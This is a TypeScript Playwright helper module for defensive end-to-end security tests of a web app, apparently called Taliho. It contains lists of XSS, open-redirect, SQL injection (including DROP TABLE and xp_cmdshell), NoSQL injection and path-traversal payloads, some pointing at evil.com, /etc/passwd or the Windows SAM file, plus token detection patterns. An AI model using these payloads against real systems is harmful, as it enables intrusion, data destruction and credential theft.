/**
 * Security Test Helpers for E2E Tests
 *
 * Provides utilities for testing common web security vulnerabilities:
 * - XSS (Cross-Site Scripting) prevention
 * - Token security and leakage prevention
 * - Open redirect prevention
 * - Account enumeration prevention
 * - API authorization testing
 */

import { Page, Request } from "@playwright/test";

// ============================================================================
// XSS PREVENTION UTILITIES
// ============================================================================

/**
 * Common XSS attack vectors for testing input sanitization.
 * These payloads cover various XSS techniques including:
 * - Script tag injection
 * - Event handler injection
 * - SVG/HTML5 element abuse
 * - JavaScript protocol handlers
 * - Unicode and encoding tricks
 */
export const XSS_VECTORS = [
  // Basic script injection
  '<script>alert("xss")</script>',
  "<script>alert(document.cookie)</script>",
  "<script src='https://evil.com/xss.js'></script>",

  // Event handler injection
  "<img src=x onerror=\"alert('xss')\">",
  '<img src="x" onerror="alert(1)">',
  "<body onload=\"alert('xss')\">",
  "<div onmouseover=\"alert('xss')\">hover me</div>",
  "<input onfocus=\"alert('xss')\" autofocus>",

  // SVG-based XSS
  "<svg onload=\"alert('xss')\">",
  '<svg><script>alert("xss")</script></svg>',

  // JavaScript protocol
  'javascript:alert("xss")',
  "javascript:alert(document.domain)",
  'javascript:void(alert("xss"))',

  // Data URL
  'data:text/html,<script>alert("xss")</script>',

  // Encoded payloads
  "&lt;script&gt;alert('xss')&lt;/script&gt;",
  "&#60;script&#62;alert('xss')&#60;/script&#62;",

  // Nested/obfuscated
  "<<script>script>alert('xss')<</script>/script>",
  '<scr<script>ipt>alert("xss")</scr</script>ipt>',

  // Template literals (for frameworks that use them)
  "${alert('xss')}",
  "{{constructor.constructor('alert(1)')()}}",
];

/**
 * XSS vectors specifically designed for URL parameters and href attributes
 */
export const URL_XSS_VECTORS = [
  'javascript:alert("xss")',
  "javascript:alert(document.domain)",
  "javascript:void(alert(1))",
  'data:text/html,<script>alert("xss")</script>',
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
  "vbscript:alert(1)",
];

/**
 * Test XSS prevention by entering malicious payloads into a form field
 * and verifying they don't execute.
 *
 * @param page - Playwright Page object
 * @param fieldSelector - CSS selector for the input field
 * @param submitSelector - CSS selector for the form submit button
 * @param vectors - Optional custom XSS vectors (defaults to XSS_VECTORS)
 */
export async function testXSSInField(
  page: Page,
  fieldSelector: string,
  submitSelector: string,
  vectors: string[] = XSS_VECTORS,
): Promise<void> {
  let alertTriggered = false;
  let alertMessage = "";

  // Listen for dialogs (alerts, confirms, prompts)
  page.on("dialog", async (dialog) => {
    alertTriggered = true;
    alertMessage = dialog.message();
    await dialog.dismiss();
  });

  for (const vector of vectors) {
    alertTriggered = false;
    alertMessage = "";

    // Clear and fill the field with XSS payload
    const field = page.locator(fieldSelector);
    await field.fill("");
    await field.fill(vector);

    // Try to submit if possible
    const submitButton = page.locator(submitSelector);
    if (await submitButton.isVisible().catch(() => false)) {
      if (await submitButton.isEnabled().catch(() => false)) {
        await submitButton.click().catch(() => {
          // Button click may fail due to validation - that's fine
        });
      }
    }

    // Wait briefly for any scripts to execute
    await page.waitForTimeout(100);

    if (alertTriggered) {
      throw new Error(
        `XSS vulnerability detected! Alert triggered with message: "${alertMessage}" for payload: ${vector}`,
      );
    }
  }
}

/**
 * Verify that XSS payloads are rendered as escaped text, not as HTML/script.
 *
 * @param page - Playwright Page object
 * @param text - The text to verify is escaped (rendered as literal text)
 */
export async function verifyEscapedRendering(
  page: Page,
  text: string,
): Promise<void> {
  // Check that the text appears literally, not as executed HTML
  const escapedLocator = page.locator(`text=${text}`);
  const isVisible = await escapedLocator.isVisible().catch(() => false);

  if (isVisible) {
    // Text is visible as literal text - good
    return;
  }

  // Check that no script tags with this content are in the DOM
  const hasScript = await page.evaluate((payload: string) => {
    const scripts = document.querySelectorAll("script");
    const scriptsArray = Array.from(scripts);
    for (const script of scriptsArray) {
      if (script.textContent?.includes(payload)) {
        return true;
      }
    }
    return false;
  }, text);

  if (hasScript) {
    throw new Error(
      `XSS vulnerability: Script tag found with content: ${text}`,
    );
  }

  // Check that dangerous elements with event handlers weren't created
  const hasDangerousElements = await page.evaluate(() => {
    const elements = document.querySelectorAll(
      "[onerror], [onload], [onclick]",
    );
    const elementsArray = Array.from(elements);
    for (const el of elementsArray) {
      for (const attr of el.getAttributeNames()) {
        if (attr.startsWith("on") && el.getAttribute(attr)?.includes("alert")) {
          return true;
        }
      }
    }
    return false;
  });

  if (hasDangerousElements) {
    throw new Error(
      `XSS vulnerability: Dangerous event handler found related to: ${text}`,
    );
  }
}

// ============================================================================
// TOKEN SECURITY UTILITIES
// ============================================================================

/**
 * Default first-party domains that are safe for token transmission.
 * Customize this list based on your application's infrastructure.
 */
export const DEFAULT_FIRST_PARTY_DOMAINS = [
  "localhost",
  "127.0.0.1",
  "taliho.io",
  "www.taliho.io",
  "api.taliho.io",
  "app.taliho.io",
];

/**
 * Common patterns that indicate authentication tokens in requests.
 */
export const DEFAULT_TOKEN_PATTERNS = [
  /Bearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/i, // JWT in Authorization header
  /eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/i, // JWT anywhere
  /accessToken=[^&\s]+/i, // Token in query param
  /access_token=[^&\s]+/i, // OAuth style token
  /token=[^&\s]+/i, // Generic token param
  /api[_-]?key=[^&\s]+/i, // API key param
  /apikey=[^&\s]+/i, // API key param (no separator)
];

/**
 * Filter requests to find those going to third-party domains.
 *
 * @param page - Playwright Page object (for context)
 * @param requests - Array of captured Request objects
 * @param firstPartyDomains - Domains considered first-party (safe)
 * @returns Array of requests sent to third-party domains
 */
export async function getRequestsToThirdParty(
  page: Page,
  requests: Request[],
  firstPartyDomains: string[] = DEFAULT_FIRST_PARTY_DOMAINS,
): Promise<Request[]> {
  // Also include the current page's hostname as first-party
  const currentUrl = new URL(page.url());
  const allFirstParty = [...firstPartyDomains, currentUrl.hostname];

  return requests.filter((request) => {
    try {
      const url = new URL(request.url());
      const hostname = url.hostname;

      // Check if this hostname matches any first-party domain
      return !allFirstParty.some(
        (domain) =>
          hostname === domain ||
          hostname.endsWith(`.${domain}`) ||
          domain === hostname,
      );
    } catch {
      // Invalid URL - consider it third-party for safety
      return true;
    }
  });
}

/**
 * Verify that no authentication tokens are leaked in a set of requests.
 *
 * @param requests - Array of Request objects to check
 * @param tokenPatterns - RegExp patterns to identify tokens
 * @throws Error if any tokens are found in the requests
 */
export async function verifyNoTokenInRequests(
  requests: Request[],
  tokenPatterns: RegExp[] = DEFAULT_TOKEN_PATTERNS,
): Promise<void> {
  const leaks: Array<{ url: string; pattern: string; location: string }> = [];

  for (const request of requests) {
    const url = request.url();
    const headers = request.headers();
    const postData = request.postData() || "";

    for (const pattern of tokenPatterns) {
      // Check URL
      if (pattern.test(url)) {
        leaks.push({
          url,
          pattern: pattern.toString(),
          location: "URL",
        });
      }

      // Check headers
      for (const [headerName, headerValue] of Object.entries(headers)) {
        if (pattern.test(headerValue)) {
          leaks.push({
            url,
            pattern: pattern.toString(),
            location: `Header: ${headerName}`,
          });
        }
      }

      // Check POST body
      if (pattern.test(postData)) {
        leaks.push({
          url,
          pattern: pattern.toString(),
          location: "POST body",
        });
      }
    }
  }

  if (leaks.length > 0) {
    const leakDetails = leaks
      .map(
        (l) =>
          `  - ${l.url}\n    Pattern: ${l.pattern}\n    Found in: ${l.location}`,
      )
      .join("\n");
    throw new Error(
      `Token leakage detected in ${leaks.length} request(s):\n${leakDetails}`,
    );
  }
}

/**
 * Verify that tokens are not stored in insecure locations.
 *
 * @param page - Playwright Page object
 * @returns Object with storage check results
 */
export async function checkTokenStorageSecurity(page: Page): Promise<{
  hasTokenInLocalStorage: boolean;
  hasTokenInSessionStorage: boolean;
  hasInsecureCookies: boolean;
  details: string[];
}> {
  const details: string[] = [];

  // Check localStorage
  const localStorageData = await page.evaluate(() => {
    const data: Record<string, string> = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        data[key] = localStorage.getItem(key) || "";
      }
    }
    return data;
  });

  const hasTokenInLocalStorage = Object.entries(localStorageData).some(
    ([key, value]) =>
      /token|jwt|auth|session/i.test(key) ||
      /eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/.test(value),
  );

  if (hasTokenInLocalStorage) {
    details.push(
      "Warning: Token found in localStorage (vulnerable to XSS attacks)",
    );
  }

  // Check sessionStorage
  const sessionStorageData = await page.evaluate(() => {
    const data: Record<string, string> = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (key) {
        data[key] = sessionStorage.getItem(key) || "";
      }
    }
    return data;
  });

  const hasTokenInSessionStorage = Object.entries(sessionStorageData).some(
    ([key, value]) =>
      /token|jwt|auth|session/i.test(key) ||
      /eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/.test(value),
  );

  if (hasTokenInSessionStorage) {
    details.push("Token found in sessionStorage");
  }

  // Check cookies
  const context = page.context();
  const cookies = await context.cookies();

  const hasInsecureCookies = cookies.some((cookie) => {
    const isTokenCookie =
      /token|jwt|auth|session/i.test(cookie.name) ||
      /eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/.test(cookie.value);

    if (isTokenCookie) {
      if (!cookie.httpOnly) {
        details.push(
          `Cookie "${cookie.name}" contains token but is not HttpOnly`,
        );
        return true;
      }
      if (!cookie.secure && !cookie.domain?.includes("localhost")) {
        details.push(
          `Cookie "${cookie.name}" contains token but is not Secure`,
        );
        return true;
      }
    }
    return false;
  });

  return {
    hasTokenInLocalStorage,
    hasTokenInSessionStorage,
    hasInsecureCookies,
    details,
  };
}

// ============================================================================
// OPEN REDIRECT UTILITIES
// ============================================================================

/**
 * Common open redirect attack vectors.
 */
export const OPEN_REDIRECT_VECTORS = [
  // Absolute URLs
  "https://evil.com",
  "https://evil.com/phishing",
  "http://evil.com",

  // Protocol-relative URLs
  "//evil.com",
  "//evil.com/phishing",

  // Backslash tricks
  "/\\evil.com",
  "\\/evil.com",
  "/\\\\evil.com",

  // JavaScript protocol
  "javascript:alert(document.domain)",
  "javascript:void(0)",
  'javascript:alert("xss")',

  // Data URLs
  "data:text/html,<script>alert(1)</script>",

  // URL parsing tricks
  "https:evil.com",
  "https:/evil.com",
  "///evil.com",
  "/\\%2F\\evil.com",

  // Unicode tricks
  "https://evil.com\u2044",
  "https://evil.com%E2%81%84",

  // Encoded characters
  "https://evil.com%2F%2E%2E",
  "/redirect?url=https%3A%2F%2Fevil.com",
];

/**
 * Test for open redirect vulnerabilities by attempting to redirect to malicious URLs.
 *
 * @param page - Playwright Page object
 * @param baseUrl - Base URL of the application
 * @param returnUrlParam - Query parameter name used for return URLs (default: "returnUrl")
 */
export async function testOpenRedirect(
  page: Page,
  baseUrl: string,
  returnUrlParam: string = "returnUrl",
): Promise<void> {
  const vulnerabilities: Array<{ vector: string; redirectedTo: string }> = [];
  const maliciousDomains = ["evil.com", "evil"];

  for (const vector of OPEN_REDIRECT_VECTORS) {
    // Construct URL with redirect parameter
    const testUrl = `${baseUrl}?${returnUrlParam}=${encodeURIComponent(vector)}`;

    try {
      // Navigate and wait for any redirects
      await page.goto(testUrl, { waitUntil: "networkidle" });

      // Check if we were redirected to an external domain
      const currentUrl = page.url();

      for (const domain of maliciousDomains) {
        if (currentUrl.includes(domain) && !baseUrl.includes(domain)) {
          vulnerabilities.push({
            vector,
            redirectedTo: currentUrl,
          });
          break;
        }
      }

      // Also check for javascript: protocol execution
      if (currentUrl.startsWith("javascript:")) {
        vulnerabilities.push({
          vector,
          redirectedTo: currentUrl,
        });
      }
    } catch {
      // Navigation errors are expected for some vectors - that's good
    }
  }

  if (vulnerabilities.length > 0) {
    const details = vulnerabilities
      .map(
        (v) => `  - Vector: ${v.vector}\n    Redirected to: ${v.redirectedTo}`,
      )
      .join("\n");
    throw new Error(`Open redirect vulnerability detected:\n${details}`);
  }
}

/**
 * Validate that a redirect URL is safe (same-origin or allowed domain).
 *
 * @param redirectUrl - URL to validate
 * @param allowedDomains - List of allowed external domains
 * @param currentOrigin - Current page origin
 * @returns Whether the redirect is safe
 */
export function isRedirectSafe(
  redirectUrl: string,
  allowedDomains: string[],
  currentOrigin: string,
): boolean {
  try {
    // Relative paths are safe
    if (redirectUrl.startsWith("/") && !redirectUrl.startsWith("//")) {
      return true;
    }

    // JavaScript protocol is never safe
    if (redirectUrl.toLowerCase().startsWith("javascript:")) {
      return false;
    }

    // Data URLs are not safe for redirects
    if (redirectUrl.toLowerCase().startsWith("data:")) {
      return false;
    }

    // Parse the URL
    const url = new URL(redirectUrl, currentOrigin);

    // Same origin is safe
    if (url.origin === currentOrigin) {
      return true;
    }

    // Check against allowed domains
    return allowedDomains.some(
      (domain) =>
        url.hostname === domain || url.hostname.endsWith(`.${domain}`),
    );
  } catch {
    // Invalid URL - not safe
    return false;
  }
}

// ============================================================================
// API AUTHORIZATION UTILITIES
// ============================================================================

/**
 * Role permission matrix for testing API authorization.
 * Maps roles to their allowed operations.
 */
export interface RolePermissionMatrix {
  admin: Record<string, boolean>;
  pm: Record<string, boolean>;
  user: Record<string, boolean>;
}

/**
 * Default permission matrix based on Taliho's RBAC model.
 * Keys are operation identifiers, values indicate whether the operation is allowed.
 */
export const DEFAULT_PERMISSION_MATRIX: RolePermissionMatrix = {
  admin: {
    // User management
    "user:create": true,
    "user:read": true,
    "user:update": true,
    "user:delete": true,
    "user:invite": true,
    // Company management
    "company:read": true,
    "company:update": true,
    "company:billing": true,
    // Project management
    "project:create": true,
    "project:read": true,
    "project:update": true,
    "project:delete": true,
    // QR Code management
    "qr:create": true,
    "qr:read": true,
    "qr:update": true,
    "qr:delete": true,
    "qr:bulk": true,
    // Group management
    "group:create": true,
    "group:read": true,
    "group:update": true,
    "group:delete": true,
    // Settings
    "settings:read": true,
    "settings:update": true,
    "settings:categories": true,
  },
  pm: {
    // User management (limited)
    "user:create": false,
    "user:read": true,
    "user:update": false,
    "user:delete": false,
    "user:invite": false,
    // Company management (limited)
    "company:read": true,
    "company:update": false,
    "company:billing": false,
    // Project management
    "project:create": true,
    "project:read": true,
    "project:update": true,
    "project:delete": false,
    // QR Code management
    "qr:create": true,
    "qr:read": true,
    "qr:update": true,
    "qr:delete": true,
    "qr:bulk": true,
    // Group management
    "group:create": true,
    "group:read": true,
    "group:update": true,
    "group:delete": true,
    // Settings (limited)
    "settings:read": true,
    "settings:update": false,
    "settings:categories": false,
  },
  user: {
    // User management (self only)
    "user:create": false,
    "user:read": false,
    "user:update": false,
    "user:delete": false,
    "user:invite": false,
    // Company management (none)
    "company:read": true,
    "company:update": false,
    "company:billing": false,
    // Project management (read only)
    "project:create": false,
    "project:read": true,
    "project:update": false,
    "project:delete": false,
    // QR Code management (limited)
    "qr:create": false,
    "qr:read": true,
    "qr:update": false,
    "qr:delete": false,
    "qr:bulk": false,
    // Group management (read only)
    "group:create": false,
    "group:read": true,
    "group:update": false,
    "group:delete": false,
    // Settings (limited)
    "settings:read": true,
    "settings:update": false,
    "settings:categories": false,
  },
};

/**
 * Check if a role has permission for a specific operation.
 *
 * @param role - User role (admin, pm, user)
 * @param operation - Operation identifier
 * @param matrix - Permission matrix to use
 * @returns Whether the operation is allowed
 */
export function hasPermission(
  role: keyof RolePermissionMatrix,
  operation: string,
  matrix: RolePermissionMatrix = DEFAULT_PERMISSION_MATRIX,
): boolean {
  const rolePermissions = matrix[role];
  return rolePermissions[operation] ?? false;
}

/**
 * Get all operations a role can perform.
 *
 * @param role - User role
 * @param matrix - Permission matrix to use
 * @returns Array of allowed operation identifiers
 */
export function getAllowedOperations(
  role: keyof RolePermissionMatrix,
  matrix: RolePermissionMatrix = DEFAULT_PERMISSION_MATRIX,
): string[] {
  const rolePermissions = matrix[role];
  return Object.entries(rolePermissions)
    .filter(([, allowed]) => allowed)
    .map(([operation]) => operation);
}

/**
 * Get all operations a role cannot perform.
 *
 * @param role - User role
 * @param matrix - Permission matrix to use
 * @returns Array of denied operation identifiers
 */
export function getDeniedOperations(
  role: keyof RolePermissionMatrix,
  matrix: RolePermissionMatrix = DEFAULT_PERMISSION_MATRIX,
): string[] {
  const rolePermissions = matrix[role];
  return Object.entries(rolePermissions)
    .filter(([, allowed]) => !allowed)
    .map(([operation]) => operation);
}

// ============================================================================
// ACCOUNT ENUMERATION UTILITIES
// ============================================================================

/**
 * Test for account enumeration vulnerabilities.
 * Compares server responses for existing vs non-existing accounts to ensure
 * they are indistinguishable (preventing attackers from discovering valid accounts).
 *
 * @param page - Playwright Page object
 * @param existingEmail - An email known to exist in the system
 * @param nonExistingEmail - An email known NOT to exist in the system
 * @param submitAction - Function that submits the form and returns
 * @returns Object containing the response text/behavior for each email
 */
export async function testAccountEnumeration(
  page: Page,
  _existingEmail: string,
  _nonExistingEmail: string,
  submitAction: () => Promise<void>,
): Promise<{ existingResponse: string; nonExistingResponse: string }> {
  // Note: Email parameters are for documentation - the submitAction callback
  // is expected to fill in the email before submitting.
  // Test with existing email (submitAction should fill this in)
  await submitAction();
  await page.waitForTimeout(500); // Wait for response

  // Capture the response/UI state for existing email
  const existingResponse = await captureResponseSignature(page);

  // Reset the form state (navigate away and back, or clear fields)
  await page.reload();
  await page.waitForTimeout(500);

  // Test with non-existing email (submitAction should fill this in)
  await submitAction();
  await page.waitForTimeout(500);

  // Capture the response/UI state for non-existing email
  const nonExistingResponse = await captureResponseSignature(page);

  return {
    existingResponse,
    nonExistingResponse,
  };
}

/**
 * Capture a "signature" of the current page state for comparison.
 * This includes visible text, error messages, and general UI state.
 */
async function captureResponseSignature(page: Page): Promise<string> {
  // Get visible error/success messages
  const messages = await page.evaluate(() => {
    const selectors = [
      ".error",
      ".success",
      ".message",
      '[role="alert"]',
      ".text-red-500",
      ".text-green-500",
      "[class*='error']",
      "[class*='success']",
      "[class*='alert']",
    ];

    const texts: string[] = [];
    for (const selector of selectors) {
      const elements = document.querySelectorAll(selector);
      elements.forEach((el) => {
        if (el.textContent?.trim()) {
          texts.push(el.textContent.trim());
        }
      });
    }

    return texts.join(" | ");
  });

  // Get the page title and URL (in case of redirects)
  const title = await page.title();
  const url = page.url();

  return `${title} :: ${url} :: ${messages}`;
}

/**
 * Verify that account enumeration is prevented.
 * Responses should be identical for existing and non-existing accounts.
 *
 * @param existingResponse - Response for existing account
 * @param nonExistingResponse - Response for non-existing account
 * @param allowedDifferences - Optional patterns that are allowed to differ
 */
export function verifyNoAccountEnumeration(
  existingResponse: string,
  nonExistingResponse: string,
  allowedDifferences: RegExp[] = [],
): void {
  let normalizedExisting = existingResponse;
  let normalizedNonExisting = nonExistingResponse;

  // Remove allowed differences
  for (const pattern of allowedDifferences) {
    normalizedExisting = normalizedExisting.replace(pattern, "");
    normalizedNonExisting = normalizedNonExisting.replace(pattern, "");
  }

  if (normalizedExisting !== normalizedNonExisting) {
    throw new Error(
      `Account enumeration vulnerability detected!\n` +
        `Responses differ for existing vs non-existing accounts:\n` +
        `  Existing account response: ${existingResponse}\n` +
        `  Non-existing account response: ${nonExistingResponse}`,
    );
  }
}

// ============================================================================
// CSRF UTILITIES
// ============================================================================

/**
 * Verify that a form includes CSRF protection.
 *
 * @param page - Playwright Page object
 * @param formSelector - CSS selector for the form
 * @returns Whether CSRF protection is present
 */
export async function hasCSRFProtection(
  page: Page,
  formSelector: string,
): Promise<boolean> {
  const form = page.locator(formSelector);

  // Check for CSRF token in hidden input
  const hasTokenInput = await form
    .locator('input[name*="csrf"], input[name*="token"], input[name="_token"]')
    .count()
    .then((count) => count > 0)
    .catch(() => false);

  if (hasTokenInput) {
    return true;
  }

  // Check for CSRF token in meta tag (used by some frameworks)
  const hasMetaToken = await page
    .locator('meta[name*="csrf"], meta[name="csrf-token"]')
    .count()
    .then((count) => count > 0)
    .catch(() => false);

  return hasMetaToken;
}

// ============================================================================
// SECURITY HEADER UTILITIES
// ============================================================================

/**
 * Expected security headers for a secure application.
 */
export const EXPECTED_SECURITY_HEADERS = {
  "content-security-policy": true,
  "x-content-type-options": "nosniff",
  "x-frame-options": /^(DENY|SAMEORIGIN)$/i,
  "x-xss-protection": /^(1|1;\s*mode=block)$/i,
  "strict-transport-security": true,
  "referrer-policy": true,
};

/**
 * Check response headers for security best practices.
 *
 * @param headers - Response headers object
 * @returns Object with missing/incorrect headers
 */
export function checkSecurityHeaders(headers: Record<string, string>): {
  missing: string[];
  incorrect: string[];
} {
  const missing: string[] = [];
  const incorrect: string[] = [];

  for (const [header, expected] of Object.entries(EXPECTED_SECURITY_HEADERS)) {
    const value = headers[header] || headers[header.toLowerCase()];

    if (!value) {
      missing.push(header);
    } else if (expected instanceof RegExp) {
      if (!expected.test(value)) {
        incorrect.push(`${header}: ${value} (expected to match ${expected})`);
      }
    } else if (typeof expected === "string") {
      if (value.toLowerCase() !== expected.toLowerCase()) {
        incorrect.push(`${header}: ${value} (expected ${expected})`);
      }
    }
    // If expected is just `true`, we only check for presence
  }

  return { missing, incorrect };
}

// ============================================================================
// RATE LIMITING UTILITIES
// ============================================================================

/**
 * Test for rate limiting on a specific action.
 *
 * @param page - Playwright Page object
 * @param action - Async function that performs the rate-limited action
 * @param expectedLimit - Expected number of requests before rate limiting
 * @param timeWindowMs - Time window in milliseconds
 * @returns Whether rate limiting was enforced
 */
export async function testRateLimiting(
  page: Page,
  action: () => Promise<void>,
  expectedLimit: number,
  timeWindowMs: number = 60000,
): Promise<{ isRateLimited: boolean; requestCount: number }> {
  const startTime = Date.now();
  let requestCount = 0;
  let isRateLimited = false;

  while (
    Date.now() - startTime < timeWindowMs &&
    requestCount < expectedLimit + 5
  ) {
    try {
      await action();
      requestCount++;

      // Check for rate limit indicators
      const hasRateLimitError = await page
        .locator("text=/rate limit|too many|slow down|try again later/i")
        .isVisible()
        .catch(() => false);

      if (hasRateLimitError) {
        isRateLimited = true;
        break;
      }
    } catch (error) {
      // 429 status would typically cause an error
      if (
        error instanceof Error &&
        (error.message.includes("429") || error.message.includes("rate"))
      ) {
        isRateLimited = true;
        break;
      }
    }
  }

  return { isRateLimited, requestCount };
}

// ============================================================================
// INPUT VALIDATION UTILITIES
// ============================================================================

/**
 * Common SQL injection payloads for testing.
 */
export const SQL_INJECTION_VECTORS = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "1' OR '1'='1' --",
  "admin'--",
  "1; SELECT * FROM users",
  "' UNION SELECT * FROM users --",
  "'; EXEC xp_cmdshell('dir'); --",
];

/**
 * Common NoSQL injection payloads for testing.
 */
export const NOSQL_INJECTION_VECTORS = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$where": "this.password.length > 0"}',
  "admin'; return '' == '",
  '{"$regex": ".*"}',
];

/**
 * Path traversal payloads for testing.
 */
export const PATH_TRAVERSAL_VECTORS = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..%252f..%252f..%252fetc/passwd",
];

/**
 * Test input field for injection vulnerabilities.
 *
 * @param page - Playwright Page object
 * @param inputSelector - CSS selector for the input
 * @param submitSelector - CSS selector for submit button
 * @param vectors - Injection vectors to test
 * @param errorIndicator - Selector or text that indicates a server error (vulnerability)
 */
export async function testInjectionVulnerability(
  page: Page,
  inputSelector: string,
  submitSelector: string,
  vectors: string[],
  errorIndicator: string = "text=/error|exception|syntax|unexpected/i",
): Promise<void> {
  const vulnerabilities: string[] = [];

  for (const vector of vectors) {
    // Fill and submit
    await page.locator(inputSelector).fill(vector);

    const submitButton = page.locator(submitSelector);
    if (await submitButton.isEnabled().catch(() => false)) {
      await submitButton.click().catch(() => {});
    }

    await page.waitForTimeout(200);

    // Check for error indicators that might reveal a vulnerability
    const hasError = await page
      .locator(errorIndicator)
      .isVisible()
      .catch(() => false);

    if (hasError) {
      vulnerabilities.push(vector);
    }

    // Clear for next test
    await page.locator(inputSelector).fill("");
  }

  if (vulnerabilities.length > 0) {
    throw new Error(
      `Potential injection vulnerability detected with payloads:\n` +
        vulnerabilities.map((v) => `  - ${v}`).join("\n"),
    );
  }
}

// ============================================================================
// SESSION SECURITY UTILITIES
// ============================================================================

/**
 * Verify session cookie security settings.
 *
 * @param page - Playwright Page object
 * @param sessionCookieName - Name of the session cookie
 */
export async function verifySessionCookieSecurity(
  page: Page,
  sessionCookieName: string = "session",
): Promise<{
  isSecure: boolean;
  isHttpOnly: boolean;
  hasSameSite: boolean;
  issues: string[];
}> {
  const context = page.context();
  const cookies = await context.cookies();
  const sessionCookie = cookies.find(
    (c) =>
      c.name === sessionCookieName ||
      c.name.toLowerCase().includes("session") ||
      c.name.toLowerCase().includes("token"),
  );

  if (!sessionCookie) {
    return {
      isSecure: false,
      isHttpOnly: false,
      hasSameSite: false,
      issues: ["Session cookie not found"],
    };
  }

  const issues: string[] = [];

  const isSecure = sessionCookie.secure;
  if (!isSecure && !sessionCookie.domain?.includes("localhost")) {
    issues.push("Session cookie is not Secure");
  }

  const isHttpOnly = sessionCookie.httpOnly;
  if (!isHttpOnly) {
    issues.push("Session cookie is not HttpOnly (vulnerable to XSS)");
  }

  const hasSameSite =
    sessionCookie.sameSite === "Strict" || sessionCookie.sameSite === "Lax";
  if (!hasSameSite) {
    issues.push("Session cookie missing SameSite attribute");
  }

  return {
    isSecure,
    isHttpOnly,
    hasSameSite,
    issues,
  };
}

/**
 * Test that session is properly invalidated on logout.
 *
 * @param page - Playwright Page object
 * @param logoutAction - Function that performs logout
 * @param protectedUrl - URL that requires authentication
 */
export async function verifySessionInvalidation(
  page: Page,
  logoutAction: () => Promise<void>,
  protectedUrl: string,
): Promise<boolean> {
  // Store current session state
  const context = page.context();
  const cookiesBefore = await context.cookies();

  // Perform logout
  await logoutAction();
  await page.waitForTimeout(500);

  // Check that session cookie is cleared or changed
  const cookiesAfter = await context.cookies();

  const sessionCookieBefore = cookiesBefore.find(
    (c) =>
      c.name.toLowerCase().includes("session") ||
      c.name.toLowerCase().includes("token"),
  );
  const sessionCookieAfter = cookiesAfter.find(
    (c) => c.name === sessionCookieBefore?.name,
  );

  const cookieCleared =
    !sessionCookieAfter ||
    sessionCookieAfter.value !== sessionCookieBefore?.value;

  // Try to access protected resource
  await page.goto(protectedUrl);
  await page.waitForTimeout(500);

  // Should be redirected to login or show unauthorized
  const isRedirectedToLogin =
    page.url().includes("login") ||
    page.url().includes("auth") ||
    page.url().includes("signin");

  const showsUnauthorized = await page
    .locator("text=/unauthorized|please log in|sign in/i")
    .isVisible()
    .catch(() => false);

  return cookieCleared && (isRedirectedToLogin || showsUnauthorized);
}
